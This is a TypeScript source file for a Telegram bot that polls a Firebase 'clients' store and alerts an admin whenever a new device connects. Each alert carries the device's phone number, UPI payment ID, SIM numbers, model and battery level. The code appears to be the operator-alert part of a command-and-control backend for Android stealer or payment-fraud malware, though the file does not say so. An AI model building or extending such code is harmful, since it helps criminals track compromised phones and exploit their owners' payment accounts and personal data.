import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import { fbGet } from "./firebase";

let knownDevices = new Set<string>();
let initialized = false;

export function startDeviceWatcher(bot: Telegraf, adminId: number): void {
  // Poll Firebase every 20 seconds for new devices
  const POLL_INTERVAL = 20_000;

  async function poll() {
    try {
      const clients = await fbGet("clients");
      if (!clients) return;

      const currentIds = new Set<string>(Object.keys(clients));

      if (!initialized) {
        // First run — seed known devices without notification
        knownDevices = currentIds;
        initialized = true;
        logger.info({ count: knownDevices.size }, "Device watcher initialized");
        return;
      }

      // Check for new devices
      for (const id of currentIds) {
        if (!knownDevices.has(id)) {
          const device = clients[id];
          const model = device?.model || "Unknown Model";
          const phone = device?.phone || "Unknown";
          const upi = device?.upi || "N/A";
          const battery = device?.battery || "?%";
          const sim1 = device?.sim1 || "";
          const sim2 = device?.sim2 || "";

          logger.info({ deviceId: id, model }, "New device detected — sending Telegram alert");

          try {
            await bot.telegram.sendMessage(
              adminId,
              `🆕 *New Device Connected!*\n\n` +
              `📱 Model: \`${model}\`\n` +
              `📞 Phone: \`${phone}\`\n` +
              `💳 UPI: \`${upi}\`\n` +
              `🔋 Battery: ${battery}\n` +
              (sim1 ? `📶 SIM1: \`${sim1}\`\n` : "") +
              (sim2 ? `📶 SIM2: \`${sim2}\`\n` : "") +
              `\n🆔 Device ID: \`${id}\``,
              { parse_mode: "Markdown" }
            );
          } catch (err) {
            logger.error({ err }, "Failed to send new device notification");
          }

          knownDevices.add(id);
        }
      }

      // Track removed devices
      for (const id of knownDevices) {
        if (!currentIds.has(id)) {
          knownDevices.delete(id);
        }
      }
    } catch (err) {
      logger.error({ err }, "Device watcher poll error");
    }
  }

  // Start polling
  setInterval(poll, POLL_INTERVAL);
  poll(); // immediate first run
  logger.info("Device watcher started (polling every 20s)");
}
